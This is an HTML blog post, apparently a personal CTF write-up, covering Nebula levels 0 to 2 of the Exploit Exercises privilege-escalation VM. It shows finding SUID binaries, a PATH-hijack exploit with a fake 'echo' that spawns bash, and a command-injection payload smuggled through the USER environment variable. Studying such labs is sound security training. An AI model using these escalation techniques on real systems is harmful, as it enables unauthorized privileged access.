@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+
+    
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans:400|Old+Standard+TT:400&display=swap" rel="stylesheet" media="print" type="text/css" onload="this.media='all'">
+    
+
+    <title>
+      
+      
+         Writeup: Nebula (level 0 - level 2) 
+      
+    </title>
+    <link rel="canonical" href="https://chuang76.github.io/posts/nebula_p1/">
+
+    <style>
+  * {
+    border:0;
+    font:inherit;
+    font-size:100%;
+    vertical-align:baseline;
+    margin:0;
+    padding:0;
+    color: black;
+    text-decoration-skip: ink;
+  }
+
+  body {
+     
+     
+    font-family: 'Verdana'; 
+     
+     
+    font-size:17px;
+    line-height:160%;
+    color:#1d1313;
+    max-width:700px;
+    margin:auto;
+  }
+
+  p {
+    margin: 20px 0;
+  }
+
+  a img {
+    border:none;
+  }
+
+  img {
+    margin: 10px auto 10px auto;
+    max-width: 100%;
+    display: block;
+  }
+
+  .left-justify { float: left; }
+  .right-justify { float:right; }
+
+  pre, code {
+    font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
+    background-color: #f7f7f7;
+  }
+
+  code {
+    font-size: 12px;
+    padding: 4px;
+  }
+
+  pre {
+    margin-top: 0;
+    margin-bottom: 16px;
+    word-wrap: normal;
+    padding: 16px;
+    overflow: auto;
+    font-size: 85%;
+    line-height: 1.45;
+  }
+
+  pre>code {
+    padding: 0;
+    margin: 0;
+    font-size: 100%;
+    word-break: normal;
+    white-space: pre;
+    background: transparent;
+    border: 0;
+  }
+
+  pre code {
+    display: inline;
+    padding: 0;
+    margin: 0;
+    overflow: visible;
+    line-height: inherit;
+    word-wrap: normal;
+    background-color: transparent;
+    border: 0;
+  }
+
+  pre code::before,
+  pre code::after {
+    content: normal;
+  }
+
+  em,q,em,dfn {
+    font-style:italic;
+  }
+
+  .sans,html .gist .gist-file .gist-meta {
+    font-family:"Open Sans","Myriad Pro",Myriad,sans-serif;
+  }
+
+  .mono,pre,code,tt,p code,li code {
+    font-family:Menlo,Monaco,"Andale Mono","lucida console","Courier New",monospace;
+  }
+
+  .heading,.serif,h1,h2,h3 {
+    font-family:"Old Standard TT",serif;
+  }
+
+  strong {
+    font-weight:600;
+  }
+
+  q:before {
+    content:"\201C";
+  }
+
+  q:after {
+    content:"\201D";
+  }
+
+  del,s {
+    text-decoration:line-through;
+  }
+
+  blockquote {
+    font-family:"Old Standard TT",serif;
+    text-align:center;
+    padding:50px;
+  }
+
+  blockquote p {
+    display:inline-block;
+    font-style:italic;
+  }
+
+  blockquote:before,blockquote:after {
+    font-family:"Old Standard TT",serif;
+    content:'\201C';
+    font-size:35px;
+    color:#403c3b;
+  }
+
+  blockquote:after {
+    content:'\201D';
+  }
+
+  hr {
+    width:40%;
+    height: 1px;
+    background:#403c3b;
+    margin: 25px auto;
+  }
+
+  h1 {
+    font-size:35px;
+  }
+
+  h2 {
+    font-size:28px;
+  }
+
+  h3 {
+    font-size:22px;
+    margin-top:18px;
+  }
+
+  h1 a,h2 a,h3 a {
+    text-decoration:none;
+  }
+
+  h1,h2 {
+    margin-top:28px;
+  }
+
+  #sub-header, .date {
+    color:#403c3b;
+    font-size:13px;
+  }
+
+  #sub-header {
+    margin: 0 4px;
+  }
+
+  #nav h1 a {
+    font-size:35px;
+    color:#1d1313;
+    line-height:120%;
+  }
+
+  .posts_listing a,#nav a {
+    text-decoration: none;
+  }
+
+  li {
+    margin-left: 20px;
+  }
+
+  ul li {
+    margin-left: 5px;
+  }
+
+  ul li {
+    list-style-type: none;
+  }
+  ul li:before {
+    content:"\00BB \0020";
+  }
+
+  #nav ul li:before, .posts_listing li:before {
+    content:'';
+    margin-right:0;
+  }
+
+  #content {
+    text-align:left;
+    width:100%;
+    font-size:15px;
+    padding:60px 0 80px;
+  }
+
+  #content h1,#content h2 {
+    margin-bottom:5px;
+  }
+
+  #content h2 {
+    font-size:25px;
+  }
+
+  #content .entry-content {
+    margin-top:15px;
+  }
+
+  #content .date {
+    margin-left:3px;
+  }
+
+  #content h1 {
+    font-size:30px;
+  }
+
+  .highlight {
+    margin: 10px 0;
+  }
+
+  .posts_listing {
+    margin:0 0 50px;
+  }
+
+  .posts_listing li {
+    margin:0 0 25px 15px;
+  }
+
+  .posts_listing li a:hover,#nav a:hover {
+    text-decoration: underline;
+  }
+
+  #nav {
+    text-align:center;
+    position:static;
+    margin-top:60px;
+  }
+
+  #nav ul {
+    display: table;
+    margin: 8px auto 0 auto;
+  }
+
+  #nav li {
+    list-style-type:none;
+    display:table-cell;
+    font-size:15px;
+    padding: 0 20px;
+  }
+
+  #links {
+    display: flex;
+    justify-content: space-between;
+    margin: 50px 0 0 0;
+  }
+
+  #links :nth-child(1) {
+    margin-right:0.5em;;
+  }
+
+  #links :nth-child(2) {
+    margin-left:0.5em;;
+  }
+
+  #not-found {
+    text-align: center;
+  }
+
+  #not-found a {
+    font-family:"Old Standard TT",serif;
+    font-size: 200px;
+    text-decoration: none;
+    display: inline-block;
+    padding-top: 225px;
+  }
+
+  @media (max-width: 750px) {
+    body {
+      padding-left:20px;
+      padding-right:20px;
+    }
+
+    #nav h1 a {
+      font-size:28px;
+    }
+
+    #nav li {
+      font-size:13px;
+      padding: 0 15px;
+    }
+
+    #content {
+      margin-top:0;
+      padding-top:50px;
+      font-size:14px;
+    }
+
+    #content h1 {
+      font-size:25px;
+    }
+
+    #content h2 {
+      font-size:22px;
+    }
+
+    .posts_listing li div {
+      font-size:12px;
+    }
+  }
+
+  @media (max-width: 400px) {
+    body {
+      padding-left:20px;
+      padding-right:20px;
+    }
+
+    #nav h1 a {
+      font-size:22px;
+    }
+
+    #nav li {
+      font-size:12px;
+      padding: 0 10px;
+    }
+
+    #content {
+      margin-top:0;
+      padding-top:20px;
+      font-size:12px;
+    }
+
+    #content h1 {
+      font-size:20px;
+    }
+
+    #content h2 {
+      font-size:18px;
+    }
+
+    .posts_listing li div{
+      font-size:12px;
+    }
+  }
+
+  @media (prefers-color-scheme: dark) {
+    *, #nav h1 a {
+      color: #FDFDFD;
+    }
+
+    body {
+      background: #121212;
+    }
+
+    pre, code {
+      background-color: #262626;
+    }
+
+    #sub-header, .date {
+      color: #BABABA;
+    }
+
+    hr {
+      background: #EBEBEB;
+    }
+  }
+</style>
+
+
+    </head>
+
+  <body>
+    <section id=nav>
+      <h1><a href="https://chuang76.github.io/">Before Dawn</a></h1>
+      <ul>
+        
+      </ul>
+    </section>
+
+
+<section id=content>
+  <h1> Writeup: Nebula (level 0 - level 2) </h1>
+
+  
+    <div id=sub-header>
+      December 2020 
+    </div>
+  
+
+  <div class="entry-content">
+    <p>Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at <a href="https://exploit-exercises.lains.space/">Exploit Exercises</a>.</p>
+<!-- raw HTML omitted -->
+<h2 id="level-0">Level 0</h2>
+<p>Here is the description about Level 0.</p>
+<pre><code>About
+This level requires you to find a Set User ID program that will run as the “flag00”
+account. You could also find this by carefully looking in top level directories in 
+/ for suspicious looking directories.
+
+Alternatively, look at the find man page.
+
+To access this level, log in as level00 with the password of level00.
+
+Source code
+There is no source code available for this level
+</code></pre><p>According to the hint, we need to find a program which can run as the &ldquo;flag00&rdquo;. Basically, &ldquo;find&rdquo; is used to search for files in a directory hierarchy. Unix systems also provide the flag <code>-perm</code> to find the file based on its permission.</p>
+<p>First, login in as level00 and check the identifier information.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/00-1.PNG?raw=true" alt=""></p>
+<p>As we mentioned above, we can search our target with find command. The slash (/) symbol means the root directory. To avoid the verbose error message, let&rsquo;s redirect stderr to a file called err (or you can redirect unwanted output to /dev/null).</p>
+<pre><code>$ find / -type f -perm /u+s 2&gt;err | grep &quot;flag00&quot;
+</code></pre><p>Two files match the conditions.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/00-2.PNG?raw=true" alt=""></p>
+<p>As you can see, the owner and the group of /bin/&hellip;/flag00 and /rofs/bin/&hellip;/flag00 is flag00 and level00, respectively. The vulnerability is that the permission of files was set to <code>rwsr-xr--</code>, that is, they are Set-UID programs. Since we logged in as level00, when we run the programs, we can get the privilege as the owner flag00.</p>
+<p>Here is the flag.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/00-3.PNG?raw=true" alt=""></p>
+<!-- raw HTML omitted -->
+<h2 id="level-1">Level 1</h2>
+<p>The description of Level 1 is provided as follows.</p>
+<pre><code>There is a vulnerability in the below program that allows arbitrary programs 
+to be executed, can you find it?
+
+To do this level, log in as the level01 account with the password level01. 
+Files for this level can be found in /home/flag01.
+</code></pre><p>The source code is also available.</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv, char **envp)
+{
+    gid_t gid;
+    uid_t uid;
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+
+    system(&quot;/usr/bin/env echo and now what?&quot;);
+}
+</code></pre><p>Let&rsquo;s run the program. The parameter &ldquo;/usr/bin/env&rdquo; is used to set the PATH. PATH is an environment variable in Unix-based systems, it tells the shell which directories to search for executable files. Then, the program displays the text &ldquo;and now what&rdquo;.</p>
+<p>However, there is a vulnerability: flag01 is a Set-UID program while it contains a system() function. So it provides the attackers to execute an arbitrary shell command.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/01-1.PNG?raw=true" alt=""></p>
+<p>Our goal is to execute system(&quot;/bin/bash&quot;), but how can we modify the parameters of system function? Here is a solution: we can modify &ldquo;echo&rdquo; as an executable to execute the /bin/bash command. In other words, we deceive the program to make it run echo as an executable, instead of its original functionality (i.e., display the text).</p>
+<p>Here is our exploit program in the /home/level01 directory, compile it and name the executable as echo.</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char** argv)
+{
+    gid_t gid = getegid();
+    uid_t uid = geteuid();
+
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+
+    system(&quot;/bin/bash&quot;);
+}
+</code></pre><p>Next, let&rsquo;s set the PATH variable. Actually, PATH is a list of directories that are walked through in the order. The colon (:) symbol is a separator. Hence, our prepared directory (i.e., the directory that contains executable echo) should be added before the original PATH variable ($PATH). So it should be</p>
+<pre><code>$ export PATH=/home/level01:$PATH 
+</code></pre><p>rather than</p>
+<pre><code>$ export PATH=$PATH:/home/level01
+</code></pre><p>Run flag01 again, and get the flag.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/01-3.PNG?raw=true" alt=""></p>
+<!-- raw HTML omitted -->
+<h2 id="level-2">Level 2</h2>
+<p>The description of Level 2 is provided as follows.</p>
+<pre><code>There is a vulnerability in the below program that allows arbitrary programs 
+to be executed, can you find it?
+
+To do this level, log in as the level02 account with the password level02. 
+Files for this level can be found in /home/flag02.
+</code></pre><p>The source code is available.</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv, char **envp)
+{
+    char *buffer;
+
+    gid_t gid;
+    uid_t uid;
+
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+
+    buffer = NULL;
+
+    asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));
+    printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);
+
+    system(buffer);
+}
+</code></pre><p>The function getenv() is used to get environment variables. The function asprintf() is used to print to allocated string. It is identical to printf(), except that after executing asprintf(), the first parameter will point to a certain string. In our case, buffer is going to point to the string &ldquo;/bin/echo %s is cool&rdquo;, and will be treated as the parameter of system() function.</p>
+<p>Again, our goal is to perform system(&quot;/bin/bash&quot;). The program contains a vulnerability: it provides the user to feed an arbitrary string to the program. As a result, we can make &ldquo;/bin/bash&rdquo; as the value of the key USER.</p>
+<p>Wait, something smells fishy. The string &ldquo;/bin/echo /bin/bash is cool&rdquo; can not make system function run properly. Since we aren&rsquo;t able to control the characters &ldquo;/bin/echo is cool&rdquo;, we can craft the string to run multiple commands. For example,</p>
+<pre><code>&quot;/bin/echo &amp;&amp; /bin/bash &amp;&amp; /bin/echo is cool&quot;
+           ^^^^^^^^^^^^^^^^^^^^^^^^^           the value of the key &quot;USER&quot;
+</code></pre><p>Here is the flag.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/02-1.PNG?raw=true" alt=""></p>
+<!-- raw HTML omitted -->
+<h2 id="brief-summary">Brief Summary</h2>
+<p>The vulnerabilities of Set-UID programs:</p>
+<ol>
+<li>user inputs</li>
+<li>environment variables</li>
+<li>system inputs controlled by users.</li>
+</ol>
+
+  </div>
+
+  <div id=links>
+    
+      <a href="https://chuang76.github.io/posts/shellshock/">&laquo;&nbsp;Writeup: shellshock</a>
+    
+    
+  </div>
+</section>
+
+  
+</body>
+</html>
+
+
+
